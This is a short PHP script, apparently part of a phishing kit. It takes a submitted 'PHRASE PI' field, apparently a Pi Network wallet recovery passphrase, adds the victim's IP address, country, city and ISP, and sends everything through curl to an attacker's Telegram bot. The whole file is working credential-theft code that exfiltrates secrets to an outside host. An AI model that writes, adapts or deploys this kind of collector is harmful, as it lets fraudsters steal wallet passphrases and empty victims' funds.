<?php
include "api.php";
include "../teleress.php";
session_start();
$ip = $_SERVER['REMOTE_ADDR'];
$pars = $_POST['pasp'];

$message = "
──────────────────────
PHRASE PI
──────────────────────
• Phrase : " . $pars . "
──────────────────────
IP INFORMATION
──────────────────────
• IP : " . $ip . "
• Country : " . $negara . "
• Region: " . $region . "
• City : " . $city . "
• ISP : " . $perdana . "
──────────────────────";

function sendMessage($idtele, $message, $token)
{
    $url = "https://api.telegram.org/bot" . $token . "/sendMessage?parse_mode=markdown&chat_id=" . $idtele;
    $url = $url . "&text=" . urlencode($message);
    $ch = curl_init();
    $optArray = array(
        CURLOPT_URL => $url,
        CURLOPT_RETURNTRANSFER => true
    );
    curl_setopt_array($ch, $optArray);
    $result = curl_exec($ch);
    curl_close($ch);
}

sendMessage($idtele, $message, $token);
